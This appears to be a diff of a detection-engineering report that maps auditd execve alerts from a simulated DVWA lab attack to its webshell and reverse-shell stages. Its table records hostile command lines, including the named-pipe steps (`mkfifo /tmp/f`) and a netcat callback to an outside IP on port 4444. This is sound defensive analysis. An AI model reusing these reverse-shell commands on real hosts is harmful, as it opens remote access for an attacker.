@@ -24,18 +24,26 @@ Analysis of [`../../06-Resources/alerts/Wazuh-Raw-Alerts.csv`](../../06-Resource
 
 This rule monitors **all** binary execution system calls (`execve`) initiated by the `www-data` service account (`uid=33`) across the entire host, without path restriction. During simulation, commands spawned by the uploaded webshell and reverse shell executed with working directory `/var/www/html/dvwa/hackable/uploads`. In the raw alerts dataset, this rule generated **20 high-fidelity audit events** tracking adversary execution across Stages 05 and 06:
 
-| Executed Binary | Working Directory | Observed Command Line / Arguments | Correlated Stage & Alert |
-|---|---|---|---|
-| `/usr/bin/id` | `/var/www/html/dvwa/hackable/uploads` | `id` | **Stage 05** (Web Shell: `wzb-61ed72e937`) |
-| `/usr/bin/rm` | `/var/www/html/dvwa/hackable/uploads` | `rm /tmp/f` | **Stage 06** (Reverse Shell preparation) |
-| `/usr/bin/cat` | `/var/www/html/dvwa/hackable/uploads` | `cat /tmp/f` | **Stage 06** (FIFO pipeline) |
-| `/usr/bin/nc.openbsd` | `/var/www/html/dvwa/hackable/uploads` | `nc 192.168.232.135 4444` | **Stage 06** (Reverse Shell: `wzb-ccae331b77`) |
-| `/usr/bin/python3` | `/var/www/html/dvwa/hackable/uploads` | `python3` interactive socket | **Stage 06** (Reverse Shell) |
-| `/usr/bin/sed`, `/usr/bin/awk` | `/var/www/html/dvwa/hackable/uploads` | Text processing and enumeration | **Stage 06** |
+| Executed Binary | Working Directory | Observed Command Line / Arguments | Invocations | Correlated Stage & Alert |
+|---|---|---|:---:|---|
+| `/usr/bin/id` | `/var/www/html/dvwa/hackable/uploads` | `id` | **2x** | **Stage 05** (Web Shell: `wzb-61ed72e937`, Alert #12) |
+| `/usr/bin/rm` | `/var/www/html/dvwa/hackable/uploads` | `rm /tmp/f` | **1x** | **Stage 06** (Named pipe reverse shell setup) |
+| `/usr/bin/cat` | `/var/www/html/dvwa/hackable/uploads` | `cat /tmp/f` | **1x** | **Stage 06** (FIFO pipe bridging) |
+| `/usr/bin/mkfifo` | `/var/www/html/dvwa/hackable/uploads` | `mkfifo /tmp/f` | **1x** | **Stage 06** (FIFO pipe creation) |
+| `/usr/bin/nc.openbsd` | `/var/www/html/dvwa/hackable/uploads` | `nc 192.168.232.135 4444` | **1x** | **Stage 06** (Reverse Shell: `wzb-ccae331b77`, Alert #15) |
+| `/usr/bin/groups` | `/var/www/html/dvwa/hackable/uploads` | `groups` | **1x** | **Stage 06** (Privilege discovery under `www-data`) |
+| `/usr/bin/stty` | `/var/www/html/dvwa/hackable/uploads` | `stty sane` | **1x** | **Stage 06** (TTY terminal stabilization) |
+| `/usr/bin/gawk` | `/var/www/html/dvwa/hackable/uploads` | Pattern extraction & subshell formatting | **6x** | **Stage 06** (Environment configuration) |
+| `/usr/bin/date` | `/var/www/html/dvwa/hackable/uploads` | Host timestamp synchronization | **3x** | **Stage 06** (System discovery) |
+| `/usr/bin/sed` | `/var/www/html/dvwa/hackable/uploads` | String replacement in terminal prompt | **3x** | **Stage 06** (Shell prompt initialization) |
 
 ---
 
 ## 3. Defense-in-Depth Rules Inventory
+
+> [!NOTE]
+> **Operational Baseline vs. Defense-in-Depth Hardening:**  
+> In `Wazuh-Raw-Alerts.csv`, exactly 20 events match `audit.key`, and all 20 correspond to `web_process_creation` (active during live capture). The remaining 8 audit keys listed below represent the fully hardened, post-incident defense-in-depth baseline codified in `06-Resources/rules/auditd/audit.rules`. Note that `audit.rules` Line 27 specifies `-k process_execution`, which maps to Wazuh Custom Rule `100180`.
 
 In addition to `web_process_creation`, [`audit.rules`](../../06-Resources/rules/auditd/audit.rules) provides comprehensive host coverage across 5 functional areas:
 
